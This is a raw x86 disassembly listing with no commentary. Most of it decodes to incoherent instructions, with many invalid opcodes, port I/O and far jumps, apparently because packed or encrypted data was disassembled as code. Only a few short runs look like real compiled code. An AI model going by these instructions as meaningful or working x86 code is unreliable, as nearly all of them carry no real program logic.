  406ada:	sbb    BYTE PTR [edi-0x7d],al
  406add:	in     eax,dx
  406ade:	sbb    dl,BYTE PTR [eax+0x2a]
  406ae1:	mov    ds:0x14b8c51,eax
  406ae6:	mov    ecx,0x3234b3db
  406aeb:	jecxz  0x406b30
  406aed:	jno    0x406ad8
  406aef:	dec    eax
  406af0:	retf   
  406af1:	jne    0x406aaf
  406af3:	sbb    eax,0x334e8dab
  406af8:	pop    es
  406af9:	les    esi,FWORD PTR [ebx-0x21]
  406afc:	dec    ecx
  406afd:	cs cmp al,0x80
  406b00:	ds add esp,ecx
  406b03:	pushf  
  406b04:	aad    0x72
  406b06:	pop    ds
  406b07:	mov    edi,0xddfcc1cd
  406b0c:	and    ebx,DWORD PTR [edi+edi*1+0x5e53c241]
  406b13:	out    0x9a,eax
  406b15:	mov    eax,0xfbe8f236
  406b1a:	in     al,dx
  406b1b:	in     al,dx
  406b1c:	fcomip st,st(7)
  406b1e:	add    al,0x6b
  406b21:	inc    esp
  406b22:	fadd   st,st(0)
  406b24:	dec    ebp
  406b25:	das    
  406b26:	test   eax,0xdfb0a1e0
  406b2b:	js     0x406ab2
  406b2d:	inc    ebp
  406b2e:	jmp    0x406b87
  406b30:	xchg   ebx,eax
  406b31:	shl    edi,1
  406b33:	pusha  
  406b34:	and    eax,0x38ec4883
  406b39:	sbb    DWORD PTR gs:[edx+0x57],edi
  406b3d:	sbb    BYTE PTR [eax-0x593b5235],0x81
  406b44:	cli    
  406b45:	push   ebx
  406b46:	(bad)  
  406b48:	jg     0x406b7b
  406b4a:	cmp    cl,BYTE PTR ds:0x619c5bfd
  406b50:	imul   edx,DWORD PTR [edx],0xffffff89
  406b53:	loope  0x406b08
  406b55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b56:	arpl   WORD PTR [esi],ax
  406b58:	cmc    
  406b59:	mov    al,BYTE PTR [eax]
  406b5b:	aaa    
  406b5c:	cmp    BYTE PTR ds:0x260eca99,bl
  406b62:	aad    0xf7
  406b64:	add    esi,DWORD PTR [eax-0x457dea4c]
  406b6a:	int    0xe4
  406b6c:	xchg   edx,eax
  406b6d:	scas   eax,DWORD PTR es:[edi]
  406b6e:	in     eax,dx
  406b6f:	xchg   DWORD PTR ds:[esi-0x2b],ebx
  406b73:	add    DWORD PTR [ebx+0x18c064f],edi
  406b79:	inc    esi
  406b7a:	mov    bh,0xf6
  406b7c:	jno    0x406aff
  406b7e:	pop    esi
  406b7f:	inc    edi
  406b80:	or     eax,0xd3b3e010
  406b85:	(bad)  
  406b86:	jl     0x406bff
  406b88:	outs   dx,DWORD PTR ds:[esi]
  406b89:	aam    0xf0
  406b8b:	int3   
  406b8c:	cmp    bh,BYTE PTR [ecx-0x40]
  406b8f:	mov    bh,0x9e
  406b91:	pop    ecx
  406b92:	icebp  
  406b93:	jmp    0x406b16
  406b95:	dec    eax
  406b96:	mov    ah,0x6a
  406b98:	cmc    
  406b99:	adc    eax,0xa05bde86
  406b9e:	fdivr  DWORD PTR [eax]
  406ba0:	rol    esp,1
  406ba2:	push   cs
  406ba3:	(bad)  
  406ba5:	or     ebp,DWORD PTR [esi+ecx*8+0x44]
  406ba9:	push   ebp
  406baa:	adc    al,0xdf
  406bac:	fld    TBYTE PTR [edx-0x12]
  406baf:	sbb    ecx,DWORD PTR [esi-0x67b1540d]
  406bb5:	cmp    al,0x2b
  406bb7:	sub    BYTE PTR [eax-0x4b],cl
  406bba:	and    esi,DWORD PTR [esi+edx*2+0x1a]
  406bbe:	stos   DWORD PTR es:[edi],eax
  406bbf:	push   ebp
  406bc0:	adc    DWORD PTR [esi+eax*1-0x6a],0xffffffc8
  406bc5:	(bad)  
  406bc7:	mov    edi,0xde9c85ea
  406bcc:	lea    esp,[edx]
  406bce:	leave  
  406bcf:	dec    edx
  406bd0:	adc    eax,0x30536072
  406bd5:	pop    ss
  406bd6:	stos   DWORD PTR es:[edi],eax
  406bd7:	jmp    0x54a3:0x5e89a32b
  406bde:	ficomp DWORD PTR [ecx-0x482c8351]
  406be4:	xor    eax,0x3c2ce1b0
  406be9:	or     bl,dl
  406beb:	sub    al,0x5b
  406bed:	sub    al,0x31
  406bef:	jmp    0x8982:0xa572080b
  406bf6:	cmc    
  406bf7:	add    esp,edi
  406bf9:	adc    eax,DWORD PTR [edi]
  406bfb:	loope  0x406c23
  406bfd:	jg     0x406ba9
  406bff:	test   BYTE PTR [eax+edx*4+0x6351f6c1],dl
  406c06:	adc    eax,ebx
  406c08:	test   DWORD PTR [edx],0x49373452
  406c0e:	data16 fwait
  406c10:	test   BYTE PTR [ebp+0x3c],ch
  406c13:	jns    0x406bcb
  406c15:	sub    BYTE PTR [eax],ch
  406c17:	cmc    
  406c18:	js     0x406c97
  406c1a:	jns    0x406c3d
  406c1c:	fbld   TBYTE PTR [ebp+0x4f010b45]
  406c22:	mov    ebp,0x7b15413a
  406c27:	int3   
  406c28:	pop    eax
  406c29:	sub    al,0x4a
  406c2b:	xor    al,BYTE PTR [edx-0xa8cbf3b]
  406c31:	inc    ebp
  406c32:	mov    ch,0x1b
  406c34:	fcmovb st,st(0)
  406c36:	aam    0x95
  406c38:	cli    
  406c39:	(bad)  
  406c3b:	shr    ecx,0xd7
  406c3e:	dec    eax
  406c3f:	sub    BYTE PTR [ebp+0x10],bh
  406c42:	xchg   ecx,eax
  406c43:	push   edx
  406c44:	xchg   ebp,eax
  406c45:	sahf   
  406c46:	cmc    
  406c47:	mov    es,ebx
  406c49:	jae    0x406bd6
  406c4b:	fs jmp 0x8a81:0xc49a88c6
  406c53:	ins    BYTE PTR es:[edi],dx
  406c54:	pop    ebp
  406c55:	xchg   DWORD PTR [eax+0xc],eax
  406c58:	pushw  0xffe5
  406c5b:	mov    bh,0x93
  406c5d:	jmp    0x406c95
  406c5f:	jo     0x406c43
  406c61:	(bad)  
  406c62:	xchg   edi,eax
  406c63:	xchg   ecx,eax
  406c64:	test   BYTE PTR ss:[edx],ah
  406c67:	addr16 icebp 
  406c69:	mov    ecx,0xa77056bf
  406c6e:	jg     0x406caa
  406c70:	cmp    eax,DWORD PTR [eax+0x1c55831b]
  406c76:	mov    gs:0x9c4d5dc8,eax
  406c7c:	arpl   WORD PTR [ebp+0x7e88667],ax
  406c82:	or     bh,BYTE PTR [esi-0x49]
  406c85:	cmp    DWORD PTR [edx+edi*2],0xc86c78b2
  406c8c:	ffreep st(0)
  406c8e:	xchg   dh,al
  406c90:	lods   eax,DWORD PTR ds:[esi]
  406c91:	jne    0x406d04
  406c93:	dec    eax
  406c94:	jbe    0x406c28
  406c96:	leave  
  406c97:	fsubr  QWORD PTR [esi+0x37]
  406c9a:	test   eax,0x7cdc0be4
  406c9f:	pop    ds
  406ca0:	jl     0x406c67
  406ca2:	repnz hlt 
  406ca4:	pop    es
  406ca5:	pop    edi
  406ca6:	mov    WORD PTR [edi+0x2c],ss
  406ca9:	inc    ebx
  406caa:	fadd   DWORD PTR [edx]
  406cac:	scas   al,BYTE PTR es:[edi]
  406cad:	push   0x4fe168ab
  406cb2:	clc    
  406cb3:	in     al,0x9b
  406cb5:	pop    edx
  406cb6:	dec    edi
  406cb7:	pop    esp
  406cb8:	jg     0x406c8f
  406cba:	mov    cl,0x1e
  406cbc:	push   ecx
  406cbd:	jmp    0xc0fc:0x35ec5df3
  406cc4:	cmp    edx,DWORD PTR [edx]
  406cc6:	mov    ?,esp
  406cc8:	popa   
  406cc9:	popa   
  406cca:	sbb    eax,0xfff475ff
  406ccf:	jne    0x406cbd
  406cd1:	call   0x405aeb
  406cd6:	test   eax,eax
  406cd8:	je     0x40739d
  406cde:	lea    eax,[ebp-0x78]
  406ce1:	jmp    0x40702e
  406ce6:	enter  0xde98,0x5a
  406cea:	outs   dx,BYTE PTR ds:[esi]
  406ceb:	bound  edx,QWORD PTR [edx+esi*4-0x2d]
  406cef:	adc    eax,0xf079d985
  406cf4:	(bad)  
  406cf5:	pop    ds
  406cf6:	retf   
  406cf7:	(bad)  
  406cf8:	jo     0x406d6a
  406cfa:	and    BYTE PTR [ebp+0x70],bh
  406cfd:	jo     0x406cbc
  406cff:	mov    cl,0x41
  406d01:	ficom  DWORD PTR [ebx+0x7b]
  406d04:	xor    eax,0xe09c2d04
  406d09:	idiv   DWORD PTR [ecx+0x42e1eae6]
  406d0f:	dec    edx
  406d10:	adc    al,0x1b
  406d12:	cmp    al,0xc4
  406d14:	mov    DWORD PTR [esi+ecx*1+0x6],esi
  406d18:	out    0xca,al
  406d1a:	mov    BYTE PTR [edx],dl
  406d1c:	dec    esi
  406d1d:	jne    0x406cf1
  406d1f:	inc    esi
  406d20:	stos   BYTE PTR es:[edi],al
  406d21:	inc    edi
  406d22:	lods   al,BYTE PTR ds:[esi]
  406d23:	mov    ebp,0x5bccf8c5
  406d28:	(bad)  
  406d29:	cmp    eax,0x318fe7cd
  406d2e:	sbb    DWORD PTR [eax+0x7dc1c3b4],0x72
  406d35:	jbe    0x406d94
  406d37:	jle    0x406d1c
  406d39:	push   edi
  406d3a:	cmp    DWORD PTR [esi+0x32bededb],esp
  406d40:	loope  0x406d18
  406d42:	push   0x0
  406d44:	scas   eax,DWORD PTR es:[edi]
  406d45:	int3   
  406d46:	int    0x3f
  406d48:	or     esp,ebx
  406d4a:	call   0xf545217a
  406d4f:	test   eax,0xe99cc402
  406d54:	or     BYTE PTR [eax],dh
  406d56:	popa   
  406d57:	jb     0x406dbc
  406d59:	fdiv   QWORD PTR [edx+0x3e0fda15]
  406d5f:	icebp  
  406d60:	xchg   esi,eax
  406d61:	dec    eax
  406d62:	call   DWORD PTR [eax]
  406d64:	pop    esi
  406d65:	icebp  
  406d66:	bound  edx,QWORD PTR [edx-0x24efb8c1]
  406d6c:	xchg   esi,eax
  406d6d:	popf   
  406d6e:	iret   
  406d6f:	frndint 
  406d71:	lahf   
  406d72:	cmp    al,0xf2
  406d74:	add    DWORD PTR ds:0x297ed4d,esi
  406d7a:	mov    DWORD PTR [eax+0x3c96b64d],ebp
  406d80:	mov    al,BYTE PTR [eax]
  406d82:	and    esp,DWORD PTR [ecx+0x69]
  406d85:	ins    BYTE PTR es:[edi],dx
  406d86:	sbb    edi,DWORD PTR [esi]
  406d88:	pop    ebx
  406d89:	add    ebx,ebp
  406d8b:	pop    ds
  406d8c:	mov    ds:0xd91b1807,eax
  406d91:	or     eax,0xd8cb242f
  406d96:	jecxz  0x406d89
  406d98:	and    dh,BYTE PTR [esi+0xc330960]
  406d9e:	retf   0xf4c5
  406da1:	into   
  406da2:	mov    ds:0xb9f6029e,al
  406da7:	dec    ebx
  406da8:	nop
  406da9:	mov    edx,ecx
  406dab:	imul   esp,eax,0x87039b83
  406db1:	xchg   edx,eax
  406db2:	and    al,0x1a
  406db4:	mov    edi,0xe11e4542
  406db9:	xor    al,0x43
  406dbb:	repz adc al,0x71
  406dbe:	xchg   esi,eax
  406dbf:	iret   
  406dc0:	es dec ebp
  406dc2:	adc    al,0x4
  406dc4:	pop    esi
  406dc5:	add    ebx,DWORD PTR cs:[eax]
  406dc8:	jno    0x406e0d
  406dca:	adc    edi,edx
  406dcc:	xchg   edx,eax
  406dcd:	scas   al,BYTE PTR es:[edi]
  406dce:	mul    BYTE PTR [esi+0x633427b5]
  406dd4:	and    BYTE PTR [esi+0x56],dh
  406dd7:	xchg   ecx,eax
  406dd8:	repz call 0x1614bf18
  406dde:	jnp    0x406e50
  406de0:	stc    
  406de1:	xor    eax,0xa9bdb243
  406de6:	loop   0x406e4b
  406de8:	mov    ch,0x2b
  406dea:	mov    ecx,0x22cfccbe
  406def:	and    BYTE PTR [esi-0x1e291e97],bh
  406df5:	mov    ah,0xb2
  406df7:	inc    esi
  406df8:	and    eax,0xcf36faa9
  406dfd:	hlt    
  406dfe:	retf   0x2c89
  406e01:	and    al,0x1b
  406e03:	pop    ds
  406e04:	mov    ch,0x5b
  406e06:	xor    DWORD PTR [ebx+eax*2+0x71],0x5e2be20
  406e0e:	sub    esp,esi
  406e10:	aam    0x9e
  406e12:	in     eax,dx
  406e13:	out    dx,eax
  406e14:	push   ebp
  406e15:	gs inc edi
  406e17:	jecxz  0x406e76
  406e19:	or     DWORD PTR [edx-0x36],ebp
  406e1c:	rcr    DWORD PTR ds:0xaf71c3da,1
  406e22:	or     DWORD PTR [eax+0x61],edi
  406e25:	push   eax
  406e26:	or     ebp,DWORD PTR [esi+0x56]
  406e29:	push   ds
  406e2a:	pop    ss
  406e2b:	bound  ecx,QWORD PTR [eax+0x67fac225]
  406e31:	push   esi
  406e32:	addr16 cwd 
  406e35:	vrcp14sd xmm0{k6},xmm0,(bad)
  406e36:	ret    0x36bd
  406e39:	dec    ebp
  406e3a:	push   es
  406e3b:	hlt    
  406e3c:	add    ah,BYTE PTR [ecx+0x5c]
  406e3f:	loopne 0x406e9a
  406e41:	test   eax,ecx
  406e43:	shl    esi,cl
  406e45:	mov    dl,0xe2
  406e47:	repnz cmp dl,BYTE PTR [ebx]
  406e4a:	mov    esp,0x1439c8c6
  406e4f:	fsub   QWORD PTR [edi-0x149ac346]
  406e55:	mov    BYTE PTR [edi],ah
  406e57:	shr    DWORD PTR [edi+esi*4],cl
  406e5a:	jl     0x406ec3
  406e5c:	loop   0x406df8
  406e5e:	cld    
  406e5f:	ins    DWORD PTR es:[edi],dx
  406e60:	nop
  406e61:	repz sub esi,DWORD PTR [ebp-0x3d70901c]
  406e68:	ins    DWORD PTR es:[edi],dx
  406e69:	int    0x8e
  406e6b:	push   ebp
  406e6c:	sti    
  406e6d:	mov    ds:0x6a590076,eax
  406e72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e73:	and    eax,0xf23f7acc
  406e78:	add    eax,0x49f2be20
  406e7d:	les    ebx,FWORD PTR [ecx+ebp*1-0x6806d39]
  406e84:	jl     0x406e6f
  406e86:	push   esp
  406e87:	stos   BYTE PTR es:[edi],al
  406e88:	mov    edx,0xb32fb8d4
  406e8d:	frstor [ebx]
  406e8f:	jl     0x406f09
  406e91:	cld    
  406e92:	lea    esp,[esi+0x3d]
  406e95:	mov    ebx,0x82a6c63e
  406e9a:	fwait
  406e9b:	ss aad 0x8f
  406e9e:	mov    edx,0x13a154f1
  406ea3:	ja     0x406eb7
  406ea5:	mov    bl,0x15
  406ea7:	in     al,0xad
  406ea9:	push   esi
  406eaa:	aaa    
  406eab:	mov    cl,0x4c
  406ead:	mov    BYTE PTR [bp+si+0x4a],bh
  406eb1:	pop    esi
  406eb2:	add    bh,BYTE PTR [edi+0x33cec505]
  406eb8:	repnz ins BYTE PTR es:[edi],dx
  406eba:	into   
  406ebb:	sub    bh,dh
  406ebd:	push   ecx
  406ebe:	xor    DWORD PTR [ecx+0x75],ecx
  406ec1:	pop    eax
  406ec2:	outs   dx,BYTE PTR ds:[esi]
  406ec3:	and    esp,ebx
  406ec5:	add    BYTE PTR [ebp+0x63],ch
  406ec8:	fwait
  406ec9:	jae    0x406edc
  406ecb:	icebp  
  406ecc:	aad    0x22
  406ece:	sub    BYTE PTR [eax+0x44],bh
  406ed1:	mov    ah,dh
  406ed3:	xchg   esi,eax
  406ed4:	dec    edi
  406ed5:	adc    ah,BYTE PTR [ebp+0x3d]
  406ed8:	inc    edi
  406ed9:	(bad)  
  406eda:	fwait
  406edb:	(bad)  
  406edc:	stc    
  406edd:	jae    0x406f55
  406edf:	stc    
  406ee0:	push   cs
  406ee1:	xchg   edx,ebp
  406ee3:	out    dx,al
  406ee4:	mov    eax,0x1e9ea034
  406ee9:	es xor edx,ebx
  406eec:	mov    dl,ah
  406eee:	sub    DWORD PTR [ecx],0xcb9d19f
  406ef4:	pop    esp
  406ef5:	or     BYTE PTR [edx+0x2d],bl
  406ef8:	retf   0xa080
  406efb:	and    al,0x87
  406efd:	cdq    
  406efe:	dec    eax
  406eff:	jns    0x406f29
  406f01:	out    dx,eax
  406f02:	ret    
  406f03:	dec    esp
  406f04:	sub    eax,0x83d01451
  406f09:	retf   
  406f0a:	xor    eax,0x56b1c69
  406f0f:	test   edx,esi
  406f11:	push   ds
  406f12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f13:	mov    ebx,0x1aeca46e
  406f18:	je     0x406edd
  406f1a:	jae    0x406edf
  406f1c:	mov    fs,WORD PTR [ecx-0x33615a81]
  406f22:	jmp    0x6bb:0x494191c6
  406f29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f2a:	jle    0x406f3a
  406f2c:	fimul  WORD PTR ds:0x8746f570
  406f32:	std    
  406f33:	ins    DWORD PTR es:[edi],dx
  406f34:	xor    ah,BYTE PTR [edx]
  406f36:	fimul  DWORD PTR [ebx+0x7b]
  406f39:	sbb    ecx,DWORD PTR [edi]
  406f3b:	inc    ebp
  406f3c:	jno    0x406ed1
  406f3e:	sub    edi,eax
  406f40:	or     BYTE PTR [ecx-0x50ff5b1d],ch
  406f46:	jbe    0x406f75
  406f48:	mov    dh,0x6
  406f4a:	fld    DWORD PTR [ebp+esi*4-0x71]
  406f4e:	out    0xc3,eax
  406f50:	lahf   
  406f51:	jmp    0x60a84802
  406f56:	jmp    0x5409f512
  406f5b:	sahf   
  406f5c:	mov    al,ds:0x995aecea
  406f61:	adc    bl,0x45
  406f64:	lods   al,BYTE PTR ds:[esi]
  406f65:	je     0x406ef0
  406f67:	inc    esp
  406f68:	ins    BYTE PTR es:[edi],dx
  406f69:	pop    ebp
  406f6a:	jp     0x406f0a
  406f6c:	xchg   ch,ch
  406f6e:	xor    ah,BYTE PTR ds:0x7d6cb710
  406f74:	addr16 inc edi
  406f76:	cmp    BYTE PTR [esp+esi*2+0x56],bl
  406f7a:	mov    eax,ds:0xb6258c26
  406f7f:	mov    BYTE PTR [ecx+edi*8+0x1e9e9d39],bl
  406f86:	daa    
  406f87:	sub    al,0x2a
  406f89:	cdq    
  406f8a:	push   esp
  406f8b:	mov    ebx,0xd5a123a4
  406f90:	inc    edi
  406f91:	add    BYTE PTR [edi+0x4d0dc9a],dl
  406f97:	mov    esp,0xe06433f8
  406f9c:	sbb    esi,ebx
  406f9e:	cwde   
  406f9f:	and    esi,DWORD PTR [edi+0x3e]
  406fa2:	adc    esp,esp
  406fa4:	cmp    al,0x8b
  406fa6:	das    
  406fa7:	mov    eax,ds:0xc08316a7
  406fac:	mov    bh,0xbb
  406fae:	dec    eax
  406faf:	sub    esp,DWORD PTR [edi+ebx*1]
  406fb2:	and    BYTE PTR [ebx],bh
  406fb4:	xchg   BYTE PTR [edi+0x4f],ah
  406fb7:	inc    esp
  406fb8:	sbb    DWORD PTR [esi-0x550eb88d],ebx
  406fbe:	dec    edi
  406fbf:	scas   al,BYTE PTR es:[edi]
  406fc0:	jbe    0x406fc9
  406fc2:	out    0x92,al
  406fc4:	adc    bh,dl
  406fc6:	fcomp  QWORD PTR [edi-0x3d2da7fd]
  406fcc:	push   cs
  406fcd:	fwait
  406fce:	neg    DWORD PTR [ebp-0x8]
  406fd1:	sbb    al,0x85
  406fd3:	sbb    al,0x48
  406fd5:	inc    ecx
  406fd6:	push   ebp
  406fd7:	pop    edi
  406fd8:	inc    esi
  406fd9:	sbb    al,0xe1
  406fdb:	xchg   ebp,eax
  406fdc:	imul   ebp,DWORD PTR [ebx-0x6e],0xf0a8f971
  406fe3:	sub    al,0x63
  406fe5:	add    DWORD PTR [edx+esi*4-0x71111991],0xfffffffc
  406fed:	outs   dx,BYTE PTR ds:[esi]
  406fee:	mov    esi,esi
  406ff0:	(bad)  
  406ff1:	es dec ebp
  406ff3:	test   BYTE PTR [ebx+0x59],0xed
  406ff7:	and    ebx,DWORD PTR [ecx]
  406ff9:	and    edi,ebp
  406ffb:	mov    edx,0x73613abb
  407000:	dec    ebx
  407001:	jge    0x40700b
  407003:	mov    BYTE PTR ds:0x91d9bf0c,cl
  407009:	push   DWORD PTR [edi-0x622da13a]
  40700f:	dec    esi
  407010:	ucomiss xmm6,DWORD PTR [ebx]
  407013:	aas    
  407014:	adc    eax,0x757e5466
  407019:	jbe    0x407012
  40701b:	(bad)  
  40701c:	aad    0xee
  40701e:	in     eax,0x69
  407020:	out    0x75,al
  407022:	retf   0x695c
  407025:	jbe    0x40700d
  407027:	sbb    DWORD PTR [ecx],edi
  407029:	mov    eax,0xf45fcdc8
  40702e:	push   eax
  40702f:	mov    eax,DWORD PTR [ebp-0x14]
  407032:	xor    eax,esi
  407034:	add    eax,edi
  407036:	push   eax
  407037:	mov    eax,DWORD PTR [ebp-0x10]
  40703a:	add    eax,0xee
  40703f:	push   eax
  407040:	mov    eax,DWORD PTR [ebp-0x10]
  407043:	jmp    0x407390
  407048:	inc    esp
  407049:	jmp    edx
  40704b:	cwde   
  40704c:	loope  0x4070af
  40704e:	inc    edx
  40704f:	pop    ebx
  407050:	(bad)  
  407051:	mov    dh,0x44
  407053:	mov    esi,0xc1cdf0e6
  407058:	sti    
  407059:	les    esi,FWORD PTR [eax+0x70]
  40705c:	and    BYTE PTR [ebp+0x70],bh
  40705f:	jo     0x407089
  407061:	shl    esp,1
  407063:	test   BYTE PTR [esi-0x579ea954],0x26
  40706a:	(bad)  
  40706b:	mov    ecx,0x507a04ba
  407070:	ror    DWORD PTR [eax+0x6b],0x6d
  407074:	jmp    0xe8c3:0x8b1caddf
  40707b:	and    ebx,DWORD PTR [eax]
  40707d:	lock scas al,BYTE PTR es:[edi]
  40707f:	out    0xff,al
  407081:	adc    esi,0xcd6ccb68
  407087:	jge    0x407018
  407089:	bound  edi,QWORD PTR cs:[esi+0xa]
  40708d:	mov    al,0xc6
  40708f:	int3   
  407090:	pop    edi
  407091:	test   DWORD PTR [eax-0x27],0x1c031363
  407098:	jp     0x4070ec
  40709a:	inc    ebx
  40709b:	loop   0x407061
  40709d:	mov    ds:0xff94cc77,al
  4070a2:	bound  esp,QWORD PTR [ecx]
  4070a4:	push   ds
  4070a5:	ins    BYTE PTR es:[edi],dx
  4070a6:	test   DWORD PTR [esi+ecx*8-0x56],esi
  4070aa:	jb     0x4070e5
  4070ac:	mov    es,WORD PTR [ecx+0x5b6bf867]
  4070b2:	imul   esi,ebx,0x2b
  4070b5:	fsub   QWORD PTR [edx-0x71a22fc7]
  4070bb:	dec    edi
  4070bc:	ret    0xeb79
  4070bf:	stos   DWORD PTR es:[edi],eax
  4070c0:	push   ds
  4070c1:	or     BYTE PTR [esi],ch
  4070c3:	cmc    
  4070c4:	xor    ecx,edx
  4070c6:	ret    
  4070c7:	(bad)
  4070cc:	out    0x1,eax
  4070ce:	push   0xffffffeb
  4070d0:	or     edi,esp
  4070d2:	jnp    0x407138
  4070d4:	imul   BYTE PTR [ebp+0x69]
  4070d7:	int3   
  4070d8:	imul   BYTE PTR [esi-0x28]
  4070db:	push   edi
  4070dc:	sub    esp,DWORD PTR [edi]
  4070de:	icebp  
  4070df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070e0:	pop    ds
  4070e1:	pop    ebp
  4070e2:	ja     0x407072
  4070e4:	fs jne 0x407148
  4070e7:	mov    esp,0x1bda4e80
  4070ec:	ficom  WORD PTR [ecx]
  4070ee:	mov    esp,DWORD PTR [edx+ebp*4+0x42]
  4070f2:	jnp    0x4070e9
  4070f4:	cmp    eax,0x2bdf8dfb
  4070f9:	and    eax,edx
  4070fb:	fidiv  WORD PTR [ecx-0xf79ebfa]
  407101:	aas    
  407102:	dec    ebx
  407103:	or     DWORD PTR [ecx],eax
  407105:	fisub  DWORD PTR [ecx+esi*1-0x62]
  407109:	out    dx,al
  40710a:	mov    ds:0x37ad0f01,al
  40710f:	(bad)  
  407110:	sti    
  407111:	aas    
  407112:	pop    ebx
  407113:	int3   
  407114:	fild   QWORD PTR [edi-0x5b06e991]
  40711a:	outs   dx,BYTE PTR ds:[esi]
  40711b:	repz pop ds
  40711d:	hlt    
  40711e:	push   esp
  40711f:	mov    ebx,DWORD PTR [eax]
  407121:	rol    BYTE PTR [eax-0x10e04ac8],1
  407127:	aam    0xaf
  407129:	loop   0x40713f
  40712b:	inc    eax
  40712c:	sahf   
  40712d:	cs pop ss
  40712f:	cmp    al,0x8c
  407131:	(bad)  
  407132:	ds div edx
  407135:	cmp    eax,0x1227664d
  40713a:	mov    cl,0x86
  40713c:	xchg   BYTE PTR [edx-0x4781795],dl
  407142:	loope  0x4070ca
  407144:	shr    ecx,0x7b
  407147:	jae    0x40716c
  407149:	cmc    
  40714a:	mov    ebp,0x13b37c77
  40714f:	adc    eax,DWORD PTR [esi]
  407151:	fld    DWORD PTR [ebp-0x3041fd19]
  407157:	jecxz  0x4071b8
  407159:	fmul   DWORD PTR [edi]
  40715b:	jl     0x4071c7
  40715d:	mov    ?,WORD PTR [ecx]
  40715f:	and    BYTE PTR [esi+0x212b8530],al
  407165:	iret   
  407166:	pop    ecx
  407167:	and    eax,0x71a1a447
  40716c:	and    eax,0xca643923
  407171:	icebp  
  407172:	scas   eax,DWORD PTR es:[edi]
  407173:	add    eax,0xa07f2a58
  407178:	int    0x3b
  40717a:	sbb    ch,dl
  40717c:	and    ebp,0xa3500e80
  407182:	inc    ebp
  407183:	mov    ds:0x6a0bc189,eax
  407188:	fst    QWORD PTR ss:[esi+0x11a541ed]
  40718f:	popa   
  407190:	addr16 push esp
  407192:	shl    DWORD PTR [ecx],cl
  407194:	cs mov ecx,0x2e571d20
  40719a:	cmp    eax,0x12248ac1
  40719f:	jbe    0x40717c
  4071a1:	cmp    al,BYTE PTR [esi]
  4071a3:	dec    ecx
  4071a4:	sahf   
  4071a5:	gs js  0x40718b
  4071a8:	or     eax,0xb8ae84c4
  4071ad:	mov    WORD PTR [edi-0x14],cs
  4071b0:	adc    esp,DWORD PTR [esp+ebx*4-0x4d64ed0d]
  4071b7:	or     cl,BYTE PTR [esi]
  4071b9:	jnp    0x407170
  4071bb:	data16 jae 0x407239
  4071be:	sahf   
  4071bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071c0:	test   ebp,ebx
  4071c2:	xchg   ecx,eax
  4071c3:	test   eax,0x3cce34f1
  4071c8:	ins    DWORD PTR es:[edi],dx
  4071c9:	dec    edx
  4071ca:	sbb    eax,0x53a181cf
  4071cf:	pop    ebp
  4071d0:	test   DWORD PTR [esi-0x2cd2ecd5],esi
  4071d6:	cmp    ebp,edx
  4071d8:	cdq    
  4071d9:	enter  0x6f79,0x5a
  4071dd:	mov    ah,0x87
  4071df:	dec    eax
  4071e0:	test   al,0xdf
  4071e2:	ss pop esp
  4071e4:	push   esi
  4071e5:	out    dx,eax
  4071e6:	stc    
  4071e7:	and    ch,0xa0
  4071ea:	out    0x3f,al
  4071ec:	push   edi
  4071ed:	rcr    DWORD PTR [ecx+ebp*2],0x77
  4071f1:	inc    esi
  4071f2:	xor    ebp,DWORD PTR ds:0x4c734ab2
  4071f8:	inc    esp
  4071f9:	rol    DWORD PTR [ebp-0x7ae8729],1
  4071ff:	sub    ch,bl
  407201:	stc    
  407202:	sub    eax,0x4fa79bcd
  407207:	push   ebx
  407208:	fwait
  407209:	and    ch,BYTE PTR [esi-0x14]
  40720c:	add    ebx,DWORD PTR [edi-0x64804c44]
  407212:	jecxz  0x40724c
  407214:	xor    ecx,esi
  407216:	(bad)  
  407217:	pushf  
  407218:	push   ss
  407219:	jl     0x407279
  40721b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40721c:	std    
  40721d:	xchg   ebp,eax
  40721e:	and    eax,0x16f21b90
  407223:	mov    ds:0xc0b9c44d,eax
  407228:	push   esi
  407229:	stos   DWORD PTR es:[edi],eax
  40722a:	push   esi
  40722b:	push   edi
  40722c:	shr    BYTE PTR [esi+0x4a],cl
  40722f:	xor    eax,0xbaf6448d
  407234:	mov    esp,0x26d68b8f
  407239:	fld    TBYTE PTR [ecx]
  40723b:	cmp    dh,BYTE PTR [edx+ebp*2+0x7567c367]
  407242:	xor    al,0x1d
  407244:	push   esp
  407245:	add    ch,ah
  407247:	sahf   
  407248:	mov    al,0x2b
  40724a:	mov    gs,WORD PTR ds:0x5cd4e584
  407250:	mov    esi,0x9667ca20
  407255:	imul   edx,DWORD PTR [ecx+0x718b4760],0xf8468519
  40725f:	add    BYTE PTR [ecx-0x72],0x4c
  407263:	aaa    
  407264:	inc    eax
  407265:	std    
  407266:	jne    0x407213
  407268:	in     eax,0xd3
  40726a:	xor    al,0x3a
  40726c:	mov    ecx,0xa7a23a31
  407271:	xchg   ecx,eax
  407272:	pusha  
  407273:	jg     0x407250
  407275:	rcr    DWORD PTR [eax],0xfa
  407278:	mov    ebx,0x82786fa6
  40727d:	int3   
  40727e:	sti    
  40727f:	dec    edi
  407280:	(bad)  
  407282:	add    DWORD PTR [esi],edx
  407284:	dec    esp
  407285:	mov    edx,0xbd53342e
  40728a:	jns    0x40725b
  40728c:	pop    edi
  40728d:	push   ds
  40728e:	jns    0x4072ca
  407290:	fiadd  DWORD PTR [edi+0x6c7cb71b]
  407296:	push   edi
  407297:	dec    ecx
  407298:	dec    esi
  407299:	fadd   QWORD PTR [ebp-0x21]
  40729c:	inc    ecx
  40729d:	adc    ebp,eax
  40729f:	in     al,0x8b
  4072a1:	cmp    al,0x31
  4072a3:	jb     0x4072c0
  4072a5:	aaa    
  4072a6:	dec    DWORD PTR ss:[ebp+0x24]
  4072aa:	push   edx
  4072ab:	lods   eax,DWORD PTR ds:[esi]
  4072ac:	jecxz  0x40726f
  4072ae:	mov    bl,0xfe
  4072b0:	jb     0x4072d7
  4072b2:	sahf   
  4072b3:	pop    es
  4072b4:	inc    ecx
  4072b5:	in     eax,0x22
  4072b7:	dec    esi
  4072b8:	cmp    eax,0x3eca5bbd
  4072bd:	pop    ss
  4072be:	xor    al,0xbb
  4072c1:	call   0x1464:0xdcec8d34
